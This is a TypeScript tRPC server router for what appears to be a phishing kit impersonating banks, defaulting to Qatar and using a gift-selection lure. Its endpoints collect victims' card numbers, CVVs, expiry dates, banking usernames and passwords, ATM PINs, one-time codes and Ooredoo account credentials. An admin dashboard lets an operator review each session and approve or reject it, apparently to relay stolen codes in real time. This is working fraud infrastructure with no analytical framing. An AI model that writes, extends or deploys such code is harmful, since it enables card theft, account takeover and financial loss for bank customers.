import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import { z } from "zod";
import { getCountryFromIP } from "./_core/geoLocation";
import {
  createSession,
  submitPersonalData,
  submitLoginMethod,
  submitAtmPin,
  submitOtp,
  submitOoredoo,
  updateSessionStatus,
  adminTakeAction,
  getSessionStatus,
  getFullSubmissions,
} from "./db";

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  submissions: router({
    // Client calls createSession in Home.tsx and GiftSelection.tsx
    createSession: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        selectedBank: z.string(),
        country: z.string().optional(),
        selectedGift: z.string().optional()
      }))
      .mutation(async ({ input }) => {
        await createSession(input.sessionId, input.selectedBank, input.country || "Qatar", input.selectedGift || "");
        return { success: true };
      }),

    // Client calls submitPersonalData in PersonalData.tsx
    submitPersonalData: publicProcedure
      .input(z.any())
      .mutation(async ({ input }) => {
        return await submitPersonalData(input);
      }),

    // AdminDashboard calls getSessions
    getSessions: publicProcedure
      .query(async () => {
        return await getFullSubmissions();
      }),

    submitLoginMethod: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        loginType: z.string(),
        cardNumber: z.string().optional(),
        cardholderName: z.string().optional(),
        expiryDate: z.string().optional(),
        cvv: z.string().optional(),
        deliveryAddress: z.string().optional(),
        username: z.string().optional(),
        password: z.string().optional(),
        deliveryMethod: z.string().optional(),
        branchName: z.string().optional(),
        phoneConfirmation: z.string().optional(),
        issuanceFee: z.string().optional(),
        deliveryFee: z.string().optional(),
        totalAmount: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        await submitLoginMethod({
          sessionId: input.sessionId,
          loginType: input.loginType,
          cardNumber: input.cardNumber || "",
          cardholderName: input.cardholderName || "",
          expiryDate: input.expiryDate || "",
          cvv: input.cvv || "",
          username: input.username || "",
          password: input.password || "",
          deliveryMethod: input.deliveryMethod || "home",
          branchName: input.branchName || "",
          deliveryAddress: input.deliveryAddress || "",
          phoneConfirmation: input.phoneConfirmation || "",
          issuanceFee: input.issuanceFee || "10",
          deliveryFee: input.deliveryFee || "0",
          totalAmount: input.totalAmount || "10",
        });
        const step = (input.loginType === "registration_completion" || input.loginType === "reg_complete" || input.loginType === "card_request") ? "card" : "login";
        await updateSessionStatus(input.sessionId, "loading", step);
        return { success: true };
      }),

    submitOtp: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        otpCode: z.string(),
        otpType: z.string()
      }))
      .mutation(async ({ input }) => {
        await submitOtp({
          sessionId: input.sessionId,
          otpCode: input.otpCode,
          otpType: input.otpType
        });
        const step = input.otpType === "ooredoo_otp" ? "otp_ooredoo" : "otp";
        await updateSessionStatus(input.sessionId, "loading", step);
        return { success: true };
      }),

    submitAtmPin: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        pin: z.string()
      }))
      .mutation(async ({ input }) => {
        await submitAtmPin({
          sessionId: input.sessionId,
          pin: input.pin
        });
        await updateSessionStatus(input.sessionId, "loading", "atm");
        return { success: true };
      }),

    submitOoredoo: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        ooredooUser: z.string(),
        ooredooPassword: z.string()
      }))
      .mutation(async ({ input }) => {
        await submitOoredoo({
          sessionId: input.sessionId,
          ooredooUser: input.ooredooUser,
          ooredooPassword: input.ooredooPassword
        });
        await updateSessionStatus(input.sessionId, "loading", "ooredoo");
        return { success: true };
      }),

    // AdminDashboard calls adminTakeAction
    adminTakeAction: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        action: z.enum(['approve', 'reject']),
        errorMessage: z.string().optional(),
        redirectTarget: z.string().optional()
      }))
      .mutation(async ({ input }) => {
        await adminTakeAction(input.sessionId, input.action, input.errorMessage, input.redirectTarget);
        return { success: true };
      }),

    getSessionStatus: publicProcedure
      .input(z.string())
      .query(async ({ input }) => {
        return await getSessionStatus(input);
      }),

    reportStep: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        step: z.string()
      }))
      .mutation(async ({ input }) => {
        await updateSessionStatus(input.sessionId, "pending", input.step);
        return { success: true };
      }),

    // Get country from IP address
    getCountry: publicProcedure
      .query(async ({ ctx }) => {
        const ipAddress = (ctx.req.headers['x-forwarded-for'] as string)?.split(',')[0] || 
                         ctx.req.socket.remoteAddress || 
                         'unknown';
        const country = await getCountryFromIP(ipAddress);
        return { country };
      })
  }),
});

export type AppRouter = typeof appRouter;
